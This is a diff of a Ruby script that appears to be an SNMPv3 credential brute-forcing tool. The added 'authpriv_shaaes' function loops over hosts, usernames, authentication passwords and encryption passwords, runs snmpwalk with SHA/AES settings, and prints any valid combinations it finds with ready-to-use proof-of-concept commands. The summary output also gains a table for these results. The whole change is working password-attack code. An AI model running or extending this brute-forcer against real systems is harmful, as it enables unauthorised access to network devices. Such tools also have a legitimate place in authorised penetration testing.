@@ -45,7 +45,7 @@ def livehosts(arg, hostfile, cmd)
         puts "#{host}: LIVE!".green.bold
         livehosts << host
       else
-        puts "#{host}: Timeout - Removing from host list".red.bold
+        puts "#{host}: Timeout/No Connection - Removing from host list".red.bold
       end
     end
   spinner.success('(Complete)')
@@ -178,7 +178,6 @@ def authpriv_md5des(arg, users, live, passwords, cmd, cryptopass)
   valid
 end
 
-
 def authpriv_md5aes(arg, users, live, passwords, cmd, cryptopass)
   valid = []
   valid << ["User", "Password", "Encryption", "Host"]
@@ -245,10 +244,40 @@ def authpriv_shades(arg, users, live, passwords, cmd, cryptopass)
   valid
 end
 
-def authpriv_shaaes
+def authpriv_shaaes(arg, users, live, passwords, cmd, cryptopass)
+  valid = []
+  valid << ["User", "Password", "Encryption", "Host"]
+  spinner = TTY::Spinner.new("[:spinner] Password Attack (SHA/AES)...", format: :spin_2)
+
+  puts "\nTesting SNMPv3 with SHA authentication and AES encryption".light_blue.bold
+  live.each do |host|
+    users.each do |user|
+      passwords.each do |password|
+        cryptopass.each do |epass|
+          if epass.length >= 8 && password.length >= 8
+            out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -a SHA -X #{epass} -x AES #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: arg[:timeout])
+              if !arg[:showfail]
+                spinner.spin
+              end
+              if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
+                puts "FOUND: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}, SHA/AES".green.bold
+                puts "POC ---> snmpwalk -u #{user} -A #{password} -a SHA -X #{epass} -x AES #{host} -v3 -l authpriv".light_magenta
+                valid << [user, password, epass, host]
+              else
+                if arg[:showfail]
+                puts "FAILED: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}".red.bold
+              end
+            end
+          end
+        end
+      end
+    end
+  end
+  spinner.success('(Complete)')
+  valid
 end
 
-def print(users, no_auth, anp, ap, apaes, apsd)
+def print(users, no_auth, anp, ap, apaes, apsd, apsa)
   #need to get the user summary working to show IPs too
   puts "\nResults Summary:\n".green.bold
     puts "Valid Users Per System:".magenta
@@ -273,6 +302,10 @@ def print(users, no_auth, anp, ap, apaes, apsd)
   puts "\nAccount and password (SHA Auth and DES Encryption - Auth OK, recommend AES for crypto!)".magenta
     puts "Example POC: snmpwalk -u username -A password -a SHA -X password -x DES 10.10.10.1 -v3 -l authpriv".light_magenta
       puts apsd.to_table(:first_row_is_head => true)
+
+  puts "\nAccount and password (SHA Auth and AES Encryption - Auth OK, Crypto OK!)".magenta
+    puts "Example POC: snmpwalk -u username -A password -a SHA -X password -x AES 10.10.10.1 -v3 -l authpriv".light_magenta
+      puts apsa.to_table(:first_row_is_head => true)
 end
 
 
@@ -289,4 +322,5 @@ anp = authnopriv(arg, users, live, passwords, cmd)
 ap = authpriv_md5des(arg, users, live, passwords, cmd, cryptopass)
 apaes = authpriv_md5aes(arg, users, live, passwords, cmd, cryptopass)
 apsd = authpriv_shades(arg, users, live, passwords, cmd, cryptopass)
-print(users, no_auth, anp, ap, apaes, apsd)
+apsa = authpriv_shaaes(arg, users, live, passwords, cmd, cryptopass)
+print(users, no_auth, anp, ap, apaes, apsd, apsa)
